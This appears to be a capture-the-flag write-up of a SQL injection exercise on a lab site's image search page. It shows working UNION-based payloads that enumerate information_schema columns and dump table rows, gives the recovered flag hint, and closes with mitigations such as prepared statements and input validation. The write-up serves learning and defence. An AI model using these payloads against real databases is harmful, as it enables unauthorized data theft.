# SQL injection advanced
[http://10.203.72.119/index.php?page=searchimg](http://10.203.72.119/index.php?page=searchimg "image search") this page is also vunreable to ***sql injection***

## Method
If we insert ***1 or 1=1*** in the search text box we get back results of all the users in the database table.

With the sql statement below we will then get the all the columns form the list_images table.
``` sql
union select 1, column_name from information_schema.columns where table_name=char(108, 105, 115, 116, 095, 105, 109, 097, 103, 101,115) 
```
We then get the following columns that are in the list_images table.
1. id
1. url
1. title
1. comment

We then get all the rows for this table with this column information. This will be achieved with the following sql statement.
``` sql
1 union select 1, concat(id, url, title, comment) from list_images
```
We then get the instructions to get the flag
```
ID: 1 union select 1, concat(id, url, title, comment) from list_images 
Title: 5borntosec.ddns.net/images.pngHack me ?If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : 1
```

## Solutions
1. Using prepared statements given that this site uses ***PHP***, prepared help the database distinguish between the ***code*** and ***user input***, by pre-compliling ***SQL*** statements to be then used as input. For ***PHP*** using ***PDO*** is one of the solutions.
1. Validating input, making use of ***regular expression*** to validate thee user input whether it matches the expected input, checking whether it contains special charcters, which would be incorrect if the input is to be a surname or name. This process can be called ***sanitization***.
1. ***Backend*** validation is very important.